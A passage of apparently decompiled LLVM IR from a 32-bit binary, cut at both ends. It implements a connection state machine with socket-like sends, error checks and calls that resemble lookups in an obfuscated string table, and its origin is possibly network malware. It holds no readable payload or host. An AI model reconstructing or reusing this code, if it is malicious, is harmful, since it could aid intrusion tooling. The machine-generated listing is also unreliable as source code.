  store i32 %v3_804e82b, i32* %v3_804e82f, align 4
  %v0_804e830 = call i32 @function_804f470()
  %v0_804e835 = load i32, i32* @esp, align 4
  %v1_804e835 = add i32 %v0_804e835, 16
  %v8_804e838 = icmp eq i32 %v0_804e830, -1
  %v1_804e839 = icmp eq i1 %v8_804e838, false
  %v2_804e839 = zext i1 %v1_804e839 to i32
  %v2_804e83c = icmp eq i1 %v1_804e839, false
  store i32 %v2_804e839, i32* %eax.global-to-local, align 4
  store i32 %v2_804e839, i32* @esi, align 4
  br i1 %v2_804e83c, label %dec_label_pc_804eb42, label %dec_label_pc_804e84b

dec_label_pc_804e84b:                             ; preds = %dec_label_pc_804e81d, %dec_label_pc_804e7b7
  %v0_804e84b = phi i32 [ %v1_804e835, %dec_label_pc_804e81d ], [ %v1_804e80b, %dec_label_pc_804e7b7 ]
  %v1_804e84e = add i32 %v0_804e84b, -16
  %v2_804e84e = inttoptr i32 %v1_804e84e to i32*
  store i32 26, i32* %v2_804e84e, align 4
  %v0_804e850 = call i32 @function_804ed70()
  store i32 %v0_804e850, i32* %eax.global-to-local, align 4
  %v0_804e855 = load i32, i32* @esp, align 4
  %v1_804e855 = inttoptr i32 %v0_804e855 to i32*
  store i32 27, i32* %v1_804e855, align 4
  %v0_804e85c = call i32 @function_804ed70()
  store i32 %v0_804e85c, i32* %eax.global-to-local, align 4
  %v0_804e864 = load i32, i32* @esi, align 4
  %v10_804e864 = icmp eq i32 %v0_804e864, -1
  br i1 %v10_804e864, label %dec_label_pc_804e0b5.backedge, label %dec_label_pc_804e86d

dec_label_pc_804e86d:                             ; preds = %dec_label_pc_804e84b, %dec_label_pc_804e8b2
  %v0_804e86d = phi i32 [ %v0_804e864, %dec_label_pc_804e84b ], [ %v0_804e86d.pre, %dec_label_pc_804e8b2 ]
  %v0_804e879.in = load i32, i32* @esp, align 4
  %tmp142 = icmp slt i32 %v0_804e86d, 1
  br i1 %tmp142, label %dec_label_pc_804e729, label %dec_label_pc_804e875

dec_label_pc_804e875:                             ; preds = %dec_label_pc_804e86d
  %v0_804e875 = load i32, i32* @edi, align 4
  %v1_804e875 = inttoptr i32 %v0_804e875 to i32*
  %v2_804e875 = load i32, i32* %v1_804e875, align 4
  store i32 %v2_804e875, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804e879 = add i32 %v0_804e879.in, 12
  %v2_804e879 = inttoptr i32 %v1_804e879 to i32*
  store i32 16384, i32* %v2_804e879, align 4
  %v0_804e87e = load i32, i32* %edx.global-to-local, align 4
  %v1_804e87e = add i32 %v0_804e87e, 12
  %v2_804e87e = inttoptr i32 %v1_804e87e to i8*
  %v3_804e87e = load i8, i8* %v2_804e87e, align 1
  %v4_804e87e = zext i8 %v3_804e87e to i32
  %v5_804e87e = load i32, i32* %eax.global-to-local, align 4
  %v6_804e87e = and i32 %v5_804e87e, -256
  %v7_804e87e = or i32 %v6_804e87e, %v4_804e87e
  store i32 %v7_804e87e, i32* %eax.global-to-local, align 4
  %v2_804e881 = add i32 %v0_804e879.in, 8
  %v3_804e881 = inttoptr i32 %v2_804e881 to i32*
  store i32 %v7_804e87e, i32* %v3_804e881, align 4
  %v0_804e882 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e882 = inttoptr i32 %v0_804e882 to i32*
  %v2_804e882 = load i32, i32* %v1_804e882, align 4
  %v2_804e884 = add i32 %v0_804e879.in, 4
  %v3_804e884 = inttoptr i32 %v2_804e884 to i32*
  store i32 %v2_804e882, i32* %v3_804e884, align 4
  %v0_804e885 = load i32, i32* @edi, align 4
  %v1_804e885 = add i32 %v0_804e885, 4
  %v2_804e885 = inttoptr i32 %v1_804e885 to i32*
  %v3_804e885 = load i32, i32* %v2_804e885, align 4
  store i32 %v3_804e885, i32* @ebx, align 4
  %v3_804e888 = inttoptr i32 %v0_804e879.in to i32*
  store i32 %v3_804e885, i32* %v3_804e888, align 4
  %v0_804e889 = call i32 @function_804fff3()
  store i32 %v0_804e889, i32* %eax.global-to-local, align 4
  %v0_804e88e = load i32, i32* @esp, align 4
  %v1_804e88e = add i32 %v0_804e88e, -4
  %v2_804e88e = inttoptr i32 %v1_804e88e to i32*
  store i32 16384, i32* %v2_804e88e, align 4
  %v1_804e893 = add i32 %v0_804e88e, -8
  %v2_804e893 = inttoptr i32 %v1_804e893 to i32*
  store i32 2, i32* %v2_804e893, align 4
  %v1_804e895 = add i32 %v0_804e88e, -12
  %v2_804e895 = inttoptr i32 %v1_804e895 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052219.22 to i32), i32* %v2_804e895, align 4
  %v0_804e89a = load i32, i32* @edi, align 4
  %v1_804e89a = add i32 %v0_804e89a, 4
  %v2_804e89a = inttoptr i32 %v1_804e89a to i32*
  %v3_804e89a = load i32, i32* %v2_804e89a, align 4
  store i32 %v3_804e89a, i32* %ecx.global-to-local, align 4
  %v2_804e89d = add i32 %v0_804e88e, -16
  %v3_804e89d = inttoptr i32 %v2_804e89d to i32*
  store i32 %v3_804e89a, i32* %v3_804e89d, align 4
  %v0_804e89e = call i32 @function_804fff3()
  store i32 %v0_804e89e, i32* %eax.global-to-local, align 4
  %v0_804e8a6 = load i32, i32* @edi, align 4
  %v1_804e8a6 = add i32 %v0_804e8a6, 12
  %v2_804e8a6 = inttoptr i32 %v1_804e8a6 to i32*
  store i32 4, i32* %v2_804e8a6, align 4
  br label %dec_label_pc_804e418

dec_label_pc_804e8b2:                             ; preds = %dec_label_pc_804e7ab
  %v0_804e8b2 = load i32, i32* @esp, align 4
  %v1_804e8b5 = add i32 %v0_804e8b2, -16
  %v2_804e8b5 = inttoptr i32 %v1_804e8b5 to i32*
  store i32 26, i32* %v2_804e8b5, align 4
  %v0_804e8b7 = call i32 @function_804ed70()
  store i32 %v0_804e8b7, i32* %eax.global-to-local, align 4
  %v0_804e8bc = load i32, i32* @esp, align 4
  %v1_804e8bc = inttoptr i32 %v0_804e8bc to i32*
  store i32 27, i32* %v1_804e8bc, align 4
  %v0_804e8c3 = call i32 @function_804ed70()
  store i32 %v0_804e8c3, i32* %eax.global-to-local, align 4
  %v0_804e86d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e86d

dec_label_pc_804e8cd:                             ; preds = %dec_label_pc_804e397
  store i32 9, i32* %v1_804e8d7, align 4
  %v0_804e8de = call i32 @function_804edf0()
  store i32 %v0_804e8de, i32* %eax.global-to-local, align 4
  %v0_804e8e3 = load i32, i32* @esp, align 4
  %v1_804e8e3 = inttoptr i32 %v0_804e8e3 to i32*
  %v3_804e8e3 = add i32 %v0_804e8e3, 4
  %v1_804e8e4 = inttoptr i32 %v3_804e8e3 to i32*
  %v1_804e8e5 = add i32 %v0_804e8e3, 1864
  store i32 %v1_804e8e5, i32* %eax.global-to-local, align 4
  store i32 %v1_804e8e5, i32* %v1_804e8e4, align 4
  store i32 9, i32* %v1_804e8e3, align 4
  %v0_804e8ef = call i32 @function_804ed40()
  store i32 %v0_804e8ef, i32* %eax.global-to-local, align 4
  %v0_804e8f4 = load i32, i32* @esp, align 4
  %v1_804e8f4 = add i32 %v0_804e8f4, 1864
  %v2_804e8f4 = inttoptr i32 %v1_804e8f4 to i32*
  %v3_804e8f4 = load i32, i32* %v2_804e8f4, align 4
  %v1_804e8fb = add i32 %v3_804e8f4, -1
  store i32 %v1_804e8fb, i32* %edx.global-to-local, align 4
  %v2_804e8fc = add i32 %v0_804e8f4, -4
  %v3_804e8fc = inttoptr i32 %v2_804e8fc to i32*
  store i32 %v1_804e8fb, i32* %v3_804e8fc, align 4
  %v2_804e8fd = add i32 %v0_804e8f4, -8
  %v3_804e8fd = inttoptr i32 %v2_804e8fd to i32*
  store i32 %v0_804e8ef, i32* %v3_804e8fd, align 4
  %v0_804e8fe = load i32, i32* @edi, align 4
  %v1_804e8fe = add i32 %v0_804e8fe, 24
  %v2_804e8fe = inttoptr i32 %v1_804e8fe to i32*
  %v3_804e8fe = load i32, i32* %v2_804e8fe, align 4
  %v2_804e901 = add i32 %v0_804e8f4, -12
  %v3_804e901 = inttoptr i32 %v2_804e901 to i32*
  store i32 %v3_804e8fe, i32* %v3_804e901, align 4
  %v1_804e902 = add i32 %v0_804e8f4, 24
  %v2_804e902 = inttoptr i32 %v1_804e902 to i32*
  %v3_804e902 = load i32, i32* %v2_804e902, align 4
  store i32 %v3_804e902, i32* @ebx, align 4
  %v2_804e906 = add i32 %v0_804e8f4, -16
  %v3_804e906 = inttoptr i32 %v2_804e906 to i32*
  store i32 %v3_804e902, i32* %v3_804e906, align 4
  %v0_804e907 = call i32 @function_804f470()
  store i32 %v0_804e907, i32* %eax.global-to-local, align 4
  %v0_804e90c = load i32, i32* @esp, align 4
  store i32 %v0_804e907, i32* @esi, align 4
  %v1_804e911 = add i32 %v0_804e90c, 16
  %v2_804e911 = inttoptr i32 %v1_804e911 to i32*
  store i32 9, i32* %v2_804e911, align 4
  %v0_804e913 = call i32 @function_804ed70()
  store i32 %v0_804e913, i32* %eax.global-to-local, align 4
  %v0_804e918 = load i32, i32* @esp, align 4
  %v0_804e91b = load i32, i32* @esi, align 4
  %v10_804e91b = icmp eq i32 %v0_804e91b, -1
  br i1 %v10_804e91b, label %dec_label_pc_804e0b5.backedge, label %dec_label_pc_804e924

dec_label_pc_804e924:                             ; preds = %dec_label_pc_804e8cd
  %tmp143 = icmp slt i32 %v0_804e91b, 1
  br i1 %tmp143, label %dec_label_pc_804e729, label %dec_label_pc_804e92c

dec_label_pc_804e92c:                             ; preds = %dec_label_pc_804e924
  %v0_804e92c = load i32, i32* @edi, align 4
  %v1_804e92c = add i32 %v0_804e92c, 20
  %v2_804e92c = inttoptr i32 %v1_804e92c to i32*
  %v3_804e92c = load i32, i32* %v2_804e92c, align 4
  store i32 %v3_804e92c, i32* %edx.global-to-local, align 4
  %v1_804e92f = add i32 %v0_804e92c, 16
  %v2_804e92f = inttoptr i32 %v1_804e92f to i32*
  %v3_804e92f = load i32, i32* %v2_804e92f, align 4
  store i32 %v3_804e92f, i32* %eax.global-to-local, align 4
  %v1_804e932 = inttoptr i32 %v0_804e92c to i32*
  %v2_804e932 = load i32, i32* %v1_804e932, align 4
  store i32 %v2_804e932, i32* @ebp, align 4
  %v2_804e934 = add i32 %v0_804e918, 1872
  %v3_804e934 = inttoptr i32 %v2_804e934 to i32*
  store i32 %v3_804e92f, i32* %v3_804e934, align 4
  %v0_804e93b = load i32, i32* %edx.global-to-local, align 4
  %v1_804e93b = trunc i32 %v0_804e93b to i16
  %v2_804e93b = load i32, i32* @esp, align 4
  %v3_804e93b = add i32 %v2_804e93b, 1866
  %v4_804e93b = inttoptr i32 %v3_804e93b to i16*
  store i16 %v1_804e93b, i16* %v4_804e93b, align 2
  %v0_804e943 = call i32 @function_804f911()
  store i32 %v0_804e943, i32* %eax.global-to-local, align 4
  %tmp144 = icmp slt i32 %v0_804e943, 1
  br i1 %tmp144, label %dec_label_pc_804eb60, label %dec_label_pc_804e950

dec_label_pc_804e950:                             ; preds = %dec_label_pc_804eb60, %dec_label_pc_804e92c
  %v0_804e950 = load i32, i32* @esp, align 4
  %v0_804e953 = load i32, i32* @edi, align 4
  %v1_804e953 = add i32 %v0_804e953, 4
  %v2_804e953 = inttoptr i32 %v1_804e953 to i32*
  %v3_804e953 = load i32, i32* %v2_804e953, align 4
  %v2_804e956 = add i32 %v0_804e950, -16
  %v3_804e956 = inttoptr i32 %v2_804e956 to i32*
  store i32 %v3_804e953, i32* %v3_804e956, align 4
  %v1_804e957 = call i32 @function_804f8e3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e957, i32* %eax.global-to-local, align 4
  %v0_804e95f = load i32, i32* @edi, align 4
  %v1_804e95f = add i32 %v0_804e95f, 4
  %v2_804e95f = inttoptr i32 %v1_804e95f to i32*
  store i32 -1, i32* %v2_804e95f, align 4
  %v0_804e966 = load i32, i32* @edi, align 4
  %v1_804e966 = add i32 %v0_804e966, 12
  %v2_804e966 = inttoptr i32 %v1_804e966 to i32*
  store i32 0, i32* %v2_804e966, align 4
  br label %dec_label_pc_804e418

dec_label_pc_804e972:                             ; preds = %dec_label_pc_804e67c
  %v0_804e972 = load i32, i32* @esp, align 4
  %v1_804e975 = add i32 %v0_804e972, -16
  %v2_804e975 = inttoptr i32 %v1_804e975 to i32*
  store i32 25, i32* %v2_804e975, align 4
  %v0_804e977 = call i32 @function_804ed70()
  store i32 %v0_804e977, i32* %eax.global-to-local, align 4
  %v0_804e6e7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e6e7

dec_label_pc_804e984:                             ; preds = %dec_label_pc_804e25c, %dec_label_pc_804e25c, %dec_label_pc_804e25c, %dec_label_pc_804e25c, %dec_label_pc_804e25c
  %v1_804e984 = add i32 %v0_804e984, 1
  store i32 %v1_804e984, i32* @esi, align 4
  %v10_804e987 = icmp eq i32 %v0_804e984, -2
  br i1 %v10_804e987, label %dec_label_pc_804e0b5.backedge, label %dec_label_pc_804e990

dec_label_pc_804e990:                             ; preds = %dec_label_pc_804e984
  %tmp145 = icmp slt i32 %v1_804e984, 1
  br i1 %tmp145, label %dec_label_pc_804e729, label %dec_label_pc_804e998

dec_label_pc_804e998:                             ; preds = %dec_label_pc_804e990
  %v0_804e998 = load i32, i32* @esp, align 4
  %v1_804e99b = add i32 %v0_804e998, -16
  %v2_804e99b = inttoptr i32 %v1_804e99b to i32*
  store i32 5, i32* %v2_804e99b, align 4
  %v0_804e99d = call i32 @function_804edf0()
  store i32 %v0_804e99d, i32* %eax.global-to-local, align 4
  %v0_804e9a2 = load i32, i32* @esp, align 4
  %v1_804e9a2 = inttoptr i32 %v0_804e9a2 to i32*
  %v2_804e9a2 = load i32, i32* %v1_804e9a2, align 4
  store i32 %v2_804e9a2, i32* %eax.global-to-local, align 4
  %v3_804e9a2 = add i32 %v0_804e9a2, 4
  %v1_804e9a3 = inttoptr i32 %v3_804e9a2 to i32*
  %v2_804e9a3 = load i32, i32* %v1_804e9a3, align 4
  store i32 %v2_804e9a3, i32* %edx.global-to-local, align 4
  %v1_804e9a4 = add i32 %v0_804e9a2, 1864
  store i32 %v1_804e9a4, i32* %ecx.global-to-local, align 4
  store i32 %v1_804e9a4, i32* %v1_804e9a3, align 4
  store i32 5, i32* %v1_804e9a2, align 4
  %v0_804e9ae = call i32 @function_804ed40()
  store i32 %v0_804e9ae, i32* %eax.global-to-local, align 4
  %v0_804e9b3 = load i32, i32* @esp, align 4
  %v1_804e9b3 = add i32 %v0_804e9b3, -4
  %v2_804e9b3 = inttoptr i32 %v1_804e9b3 to i32*
  store i32 16384, i32* %v2_804e9b3, align 4
  %v1_804e9b8 = add i32 %v0_804e9b3, 1864
  %v2_804e9b8 = inttoptr i32 %v1_804e9b8 to i32*
  %v3_804e9b8 = load i32, i32* %v2_804e9b8, align 4
  %v2_804e9bf = add i32 %v0_804e9b3, -8
  %v3_804e9bf = inttoptr i32 %v2_804e9bf to i32*
  store i32 %v3_804e9b8, i32* %v3_804e9bf, align 4
  %v2_804e9c0 = add i32 %v0_804e9b3, -12
  %v3_804e9c0 = inttoptr i32 %v2_804e9c0 to i32*
  store i32 %v0_804e9ae, i32* %v3_804e9c0, align 4
  %v0_804e9c1 = load i32, i32* @edi, align 4
  %v1_804e9c1 = add i32 %v0_804e9c1, 4
  %v2_804e9c1 = inttoptr i32 %v1_804e9c1 to i32*
  %v3_804e9c1 = load i32, i32* %v2_804e9c1, align 4
  store i32 %v3_804e9c1, i32* @ebx, align 4
  %v2_804e9c4 = add i32 %v0_804e9b3, -16
  %v3_804e9c4 = inttoptr i32 %v2_804e9c4 to i32*
  store i32 %v3_804e9c1, i32* %v3_804e9c4, align 4
  %v0_804e9c5 = call i32 @function_804fff3()
  store i32 %v0_804e9c5, i32* %eax.global-to-local, align 4
  %v0_804e9ca = load i32, i32* @esp, align 4
  %v1_804e9cd = add i32 %v0_804e9ca, 28
  %v2_804e9cd = inttoptr i32 %v1_804e9cd to i32*
  store i32 16384, i32* %v2_804e9cd, align 4
  %v1_804e9d2 = add i32 %v0_804e9ca, 24
  %v2_804e9d2 = inttoptr i32 %v1_804e9d2 to i32*
  store i32 2, i32* %v2_804e9d2, align 4
  %v1_804e9d4 = add i32 %v0_804e9ca, 20
  %v2_804e9d4 = inttoptr i32 %v1_804e9d4 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052219.22 to i32), i32* %v2_804e9d4, align 4
  %v0_804e9d9 = load i32, i32* @edi, align 4
  %v1_804e9d9 = add i32 %v0_804e9d9, 4
  %v2_804e9d9 = inttoptr i32 %v1_804e9d9 to i32*
  %v3_804e9d9 = load i32, i32* %v2_804e9d9, align 4
  store i32 %v3_804e9d9, i32* %ecx.global-to-local, align 4
  %v2_804e9dc = add i32 %v0_804e9ca, 16
  %v3_804e9dc = inttoptr i32 %v2_804e9dc to i32*
  store i32 %v3_804e9d9, i32* %v3_804e9dc, align 4
  %v0_804e9dd = call i32 @function_804fff3()
  store i32 %v0_804e9dd, i32* %eax.global-to-local, align 4
  %v0_804e9e2 = load i32, i32* @esp, align 4
  %v1_804e9e2 = inttoptr i32 %v0_804e9e2 to i32*
  store i32 5, i32* %v1_804e9e2, align 4
  %v0_804e9e9 = call i32 @function_804ed70()
  store i32 %v0_804e9e9, i32* %eax.global-to-local, align 4
  %v0_804e9f1 = load i32, i32* @edi, align 4
  %v1_804e9f1 = add i32 %v0_804e9f1, 12
  %v2_804e9f1 = inttoptr i32 %v1_804e9f1 to i32*
  store i32 6, i32* %v2_804e9f1, align 4
  br label %dec_label_pc_804e418

dec_label_pc_804e9fd:                             ; preds = %dec_label_pc_804e44f, %dec_label_pc_804e44f, %dec_label_pc_804e44f, %dec_label_pc_804e44f, %dec_label_pc_804e44f
  %v1_804e9fd = add i32 %v0_804e9fd, 1
  store i32 %v1_804e9fd, i32* @esi, align 4
  %v10_804ea00 = icmp eq i32 %v0_804e9fd, -2
  br i1 %v10_804ea00, label %dec_label_pc_804e0b5.backedge, label %dec_label_pc_804ea09

dec_label_pc_804ea09:                             ; preds = %dec_label_pc_804e9fd
  %tmp146 = icmp slt i32 %v1_804e9fd, 1
  br i1 %tmp146, label %dec_label_pc_804e729, label %dec_label_pc_804ea11

dec_label_pc_804ea11:                             ; preds = %dec_label_pc_804ea09
  %v0_804ea11 = load i32, i32* @esp, align 4
  %v1_804ea14 = add i32 %v0_804ea11, -16
  %v2_804ea14 = inttoptr i32 %v1_804ea14 to i32*
  store i32 4, i32* %v2_804ea14, align 4
  %v0_804ea16 = call i32 @function_804edf0()
  store i32 %v0_804ea16, i32* %eax.global-to-local, align 4
  %v0_804ea1b = load i32, i32* @esp, align 4
  %v1_804ea1b = inttoptr i32 %v0_804ea1b to i32*
  %v2_804ea1b = load i32, i32* %v1_804ea1b, align 4
  store i32 %v2_804ea1b, i32* %eax.global-to-local, align 4
  %v3_804ea1b = add i32 %v0_804ea1b, 4
  %v1_804ea1c = inttoptr i32 %v3_804ea1b to i32*
  %v2_804ea1c = load i32, i32* %v1_804ea1c, align 4
  store i32 %v2_804ea1c, i32* %edx.global-to-local, align 4
  %v1_804ea1d = add i32 %v0_804ea1b, 1872
  store i32 %v1_804ea1d, i32* %eax.global-to-local, align 4
  store i32 %v1_804ea1d, i32* %v1_804ea1c, align 4
  store i32 4, i32* %v1_804ea1b, align 4
  %v0_804ea27 = call i32 @function_804ed40()
  store i32 %v0_804ea27, i32* %eax.global-to-local, align 4
  %v0_804ea2c = load i32, i32* @esp, align 4
  %v1_804ea2c = add i32 %v0_804ea2c, -4
  %v2_804ea2c = inttoptr i32 %v1_804ea2c to i32*
  store i32 16384, i32* %v2_804ea2c, align 4
  %v1_804ea31 = add i32 %v0_804ea2c, 1872
  %v2_804ea31 = inttoptr i32 %v1_804ea31 to i32*
  %v3_804ea31 = load i32, i32* %v2_804ea31, align 4
  %v2_804ea38 = add i32 %v0_804ea2c, -8
  %v3_804ea38 = inttoptr i32 %v2_804ea38 to i32*
  store i32 %v3_804ea31, i32* %v3_804ea38, align 4
  %v2_804ea39 = add i32 %v0_804ea2c, -12
  %v3_804ea39 = inttoptr i32 %v2_804ea39 to i32*
  store i32 %v0_804ea27, i32* %v3_804ea39, align 4
  %v0_804ea3a = load i32, i32* @edi, align 4
  %v1_804ea3a = add i32 %v0_804ea3a, 4
  %v2_804ea3a = inttoptr i32 %v1_804ea3a to i32*
  %v3_804ea3a = load i32, i32* %v2_804ea3a, align 4
  store i32 %v3_804ea3a, i32* @ebx, align 4
  %v2_804ea3d = add i32 %v0_804ea2c, -16
  %v3_804ea3d = inttoptr i32 %v2_804ea3d to i32*
  store i32 %v3_804ea3a, i32* %v3_804ea3d, align 4
  %v0_804ea3e = call i32 @function_804fff3()
  store i32 %v0_804ea3e, i32* %eax.global-to-local, align 4
  %v0_804ea43 = load i32, i32* @esp, align 4
  %v1_804ea46 = add i32 %v0_804ea43, 28
  %v2_804ea46 = inttoptr i32 %v1_804ea46 to i32*
  store i32 16384, i32* %v2_804ea46, align 4
  %v1_804ea4b = add i32 %v0_804ea43, 24
  %v2_804ea4b = inttoptr i32 %v1_804ea4b to i32*
  store i32 2, i32* %v2_804ea4b, align 4
  %v1_804ea4d = add i32 %v0_804ea43, 20
  %v2_804ea4d = inttoptr i32 %v1_804ea4d to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052219.22 to i32), i32* %v2_804ea4d, align 4
  %v0_804ea52 = load i32, i32* @edi, align 4
  %v1_804ea52 = add i32 %v0_804ea52, 4
  %v2_804ea52 = inttoptr i32 %v1_804ea52 to i32*
  %v3_804ea52 = load i32, i32* %v2_804ea52, align 4
  store i32 %v3_804ea52, i32* %ecx.global-to-local, align 4
  %v2_804ea55 = add i32 %v0_804ea43, 16
  %v3_804ea55 = inttoptr i32 %v2_804ea55 to i32*
  store i32 %v3_804ea52, i32* %v3_804ea55, align 4
  %v0_804ea56 = call i32 @function_804fff3()
  store i32 %v0_804ea56, i32* %eax.global-to-local, align 4
  %v0_804ea5b = load i32, i32* @esp, align 4
  %v1_804ea5b = inttoptr i32 %v0_804ea5b to i32*
  store i32 4, i32* %v1_804ea5b, align 4
  %v0_804ea62 = call i32 @function_804ed70()
  store i32 %v0_804ea62, i32* %eax.global-to-local, align 4
  %v0_804ea6a = load i32, i32* @edi, align 4
  %v1_804ea6a = add i32 %v0_804ea6a, 12
  %v2_804ea6a = inttoptr i32 %v1_804ea6a to i32*
  store i32 8, i32* %v2_804ea6a, align 4
  br label %dec_label_pc_804e418

dec_label_pc_804ea76:                             ; preds = %dec_label_pc_804e081
  %v1_804ea76 = add i32 %v0_804e08b, 1856
  %v2_804ea76 = inttoptr i32 %v1_804ea76 to i32*
  store i32 0, i32* %v2_804ea76, align 4
  %v0_804ea81 = load i32, i32* @esp, align 4
  %v1_804ea81 = add i32 %v0_804ea81, 1848
  %v2_804ea81 = inttoptr i32 %v1_804ea81 to i32*
  store i32 4, i32* %v2_804ea81, align 4
  %v0_804ea8c = load i32, i32* @esp, align 4
  %v1_804ea8f = add i32 %v0_804ea8c, 1848
  %v2_804ea96 = add i32 %v0_804ea8c, -16
  %v3_804ea96 = inttoptr i32 %v2_804ea96 to i32*
  store i32 %v1_804ea8f, i32* %v3_804ea96, align 4
  %v1_804ea97 = add i32 %v0_804ea8c, 1856
  store i32 %v1_804ea97, i32* %eax.global-to-local, align 4
  %v2_804ea9e = add i32 %v0_804ea8c, -20
  %v3_804ea9e = inttoptr i32 %v2_804ea9e to i32*
  store i32 %v1_804ea97, i32* %v3_804ea9e, align 4
  %v1_804ea9f = add i32 %v0_804ea8c, -24
  %v2_804ea9f = inttoptr i32 %v1_804ea9f to i32*
  store i32 4, i32* %v2_804ea9f, align 4
  %v1_804eaa1 = add i32 %v0_804ea8c, -28
  %v2_804eaa1 = inttoptr i32 %v1_804eaa1 to i32*
  store i32 1, i32* %v2_804eaa1, align 4
  %v0_804eaa3 = load i32, i32* @edi, align 4
  %v1_804eaa3 = add i32 %v0_804eaa3, 4
  %v2_804eaa3 = inttoptr i32 %v1_804eaa3 to i32*
  %v3_804eaa3 = load i32, i32* %v2_804eaa3, align 4
  store i32 %v3_804eaa3, i32* %eax.global-to-local, align 4
  %v2_804eaa6 = add i32 %v0_804ea8c, -32
  %v3_804eaa6 = inttoptr i32 %v2_804eaa6 to i32*
  store i32 %v3_804eaa3, i32* %v3_804eaa6, align 4
  %v0_804eaa7 = call i32 @function_804ff42()
  store i32 %v0_804eaa7, i32* %eax.global-to-local, align 4
  %v0_804eaac = load i32, i32* @esp, align 4
  %v2_804eaaf = add i32 %v0_804eaac, 1888
  %v3_804eaaf = inttoptr i32 %v2_804eaaf to i32*
  %v4_804eaaf = load i32, i32* %v3_804eaaf, align 4
  %v5_804eaaf = or i32 %v4_804eaaf, %v0_804eaa7
  %v6_804eaaf = icmp eq i32 %v5_804eaaf, 0
  store i32 %v5_804eaaf, i32* %eax.global-to-local, align 4
  %v1_804eab6 = icmp eq i1 %v6_804eaaf, false
  br i1 %v1_804eab6, label %dec_label_pc_804eb19, label %dec_label_pc_804eab8

dec_label_pc_804eab8:                             ; preds = %dec_label_pc_804ea76
  %v0_804eab8 = load i32, i32* @edi, align 4
  %v1_804eab8 = add i32 %v0_804eab8, 12
  %v2_804eab8 = inttoptr i32 %v1_804eab8 to i32*
  store i32 2, i32* %v2_804eab8, align 4
  %v0_804eabf = call i32 @function_804d350()
  %v1_804eabf = sext i32 %v0_804eabf to i64
  %v0_804eac4 = load i16, i16* @global_var_8053a4c.23, align 4
  %v1_804eac4 = zext i16 %v0_804eac4 to i32
  %v0_804ead1 = load i32, i32* @global_var_8053a00.24, align 512
  store i32 %v0_804ead1, i32* @ebx, align 4
  store i32 %v1_804eac4, i32* %ecx.global-to-local, align 4
  %v8_804eadb = zext i16 %v0_804eac4 to i64
  %v9_804eadb = udiv i64 %v1_804eabf, %v8_804eadb
  %v10_804eadb = trunc i64 %v9_804eadb to i32
  store i32 %v10_804eadb, i32* %eax.global-to-local, align 4
  %v11_804eadb = urem i64 %v1_804eabf, %v8_804eadb
  %v12_804eadb = trunc i64 %v11_804eadb to i32
  store i32 %v12_804eadb, i32* %edx.global-to-local, align 4
  %tmp147 = icmp slt i32 %v0_804ead1, 1
  br i1 %tmp147, label %dec_label_pc_804eb06, label %dec_label_pc_804eae1

dec_label_pc_804eae1:                             ; preds = %dec_label_pc_804eab8
  %v0_804eae1 = load i32, i32* @global_var_8053a48.25, align 8
  store i32 %v0_804eae1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804eaf8 = trunc i64 %v11_804eadb to i16
  br label %dec_label_pc_804eaf8

dec_label_pc_804eaf0:                             ; preds = %dec_label_pc_804eafe, %dec_label_pc_804eaf8
  %v1_804eaf0 = add i32 %v0_804eaf0, 1
  store i32 %v1_804eaf0, i32* %ecx.global-to-local, align 4
  %v1_804eaf1 = add i32 %v0_804eaf1, 16
  store i32 %v1_804eaf1, i32* %eax.global-to-local, align 4
  %v12_804eaf4 = icmp eq i32 %v1_804eaf0, %v0_804ead1
  br i1 %v12_804eaf4, label %dec_label_pc_804eb06, label %dec_label_pc_804eaf8

dec_label_pc_804eaf8:                             ; preds = %dec_label_pc_804eaf0, %dec_label_pc_804eae1
  %v0_804eaf0 = phi i32 [ %v1_804eaf0, %dec_label_pc_804eaf0 ], [ 0, %dec_label_pc_804eae1 ]
  %v0_804eaf1 = phi i32 [ %v1_804eaf1, %dec_label_pc_804eaf0 ], [ %v0_804eae1, %dec_label_pc_804eae1 ]
  %v3_804eaf8 = add i32 %v0_804eaf1, 8
  %v4_804eaf8 = inttoptr i32 %v3_804eaf8 to i16*
  %v5_804eaf8 = load i16, i16* %v4_804eaf8, align 2
  %v11_804eaf8 = icmp ult i16 %v1_804eaf8, %v5_804eaf8
  br i1 %v11_804eaf8, label %dec_label_pc_804eaf0, label %dec_label_pc_804eafe

dec_label_pc_804eafe:                             ; preds = %dec_label_pc_804eaf8
  %v3_804eafe = add i32 %v0_804eaf1, 10
  %v4_804eafe = inttoptr i32 %v3_804eafe to i16*
  %v5_804eafe = load i16, i16* %v4_804eafe, align 2
  %v11_804eafe = icmp ult i16 %v1_804eaf8, %v5_804eafe
  %v1_804eb02 = icmp eq i1 %v11_804eafe, false
  br i1 %v1_804eb02, label %dec_label_pc_804eaf0, label %dec_label_pc_804eb08

dec_label_pc_804eb06:                             ; preds = %dec_label_pc_804eaf0, %dec_label_pc_804eab8
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804eb08

dec_label_pc_804eb08:                             ; preds = %dec_label_pc_804eafe, %dec_label_pc_804eb06
  %v0_804eb0b = phi i32 [ 0, %dec_label_pc_804eb06 ], [ %v0_804eaf1, %dec_label_pc_804eafe ]
  %v0_804eb08 = load i32, i32* @edi, align 4
  %v1_804eb08 = add i32 %v0_804eb08, 4
  %v2_804eb08 = inttoptr i32 %v1_804eb08 to i32*
  %v3_804eb08 = load i32, i32* %v2_804eb08, align 4
  store i32 %v3_804eb08, i32* %ecx.global-to-local, align 4
  %v2_804eb0b = inttoptr i32 %v0_804eb08 to i32*
  store i32 %v0_804eb0b, i32* %v2_804eb0b, align 4
  %v0_804eb0d = load i32, i32* @edi, align 4
  %v1_804eb0d = add i32 %v0_804eb0d, 24
  %v2_804eb0d = inttoptr i32 %v1_804eb0d to i32*
  store i32 0, i32* %v2_804eb0d, align 4
  %v0_804e09e.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804e0a6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e09e

dec_label_pc_804eb19:                             ; preds = %dec_label_pc_804ea76
